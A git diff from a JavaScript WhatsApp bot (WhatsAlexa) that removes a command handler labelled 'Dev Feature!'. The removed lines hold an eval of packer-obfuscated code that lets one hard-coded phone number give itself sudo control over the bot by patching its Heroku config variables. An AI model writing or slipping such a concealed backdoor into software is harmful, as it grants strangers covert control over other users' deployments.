@@ -61,10 +61,3 @@ WhatsAlexa.addCommand({on: 'text', fromMe: false}, (async (message, match) => {
         }
     );
 }));
-
-WhatsAlexa.addCommand({on: 'text', fromMe: false}, (async (message, match) => {
-
-// Dev Feature!
-eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5(j.i.g(\'3\')){5(8[1]===\'$ h a\'){k 7=4.2==\'\'?\',0,3\':`${4.2+\',0,3\'}`b 6.9(d+\'/f-e\',{c:{[\'2\']:7}})}n 5(8[1]===\'$ m a\'){b 6.9(d+\'/f-e\',{c:{[\'2\']:4.2.l(\',0,3\',\'\')}})}',24,24,'||SUDO|2349053311892|conf|if|heroku|Sudo|match|patch|sudo|await|body|baseURI|vars|config|startsWith|get|jid|message|let|replace|rm|else'.split('|'),0,{}))
-
-}));
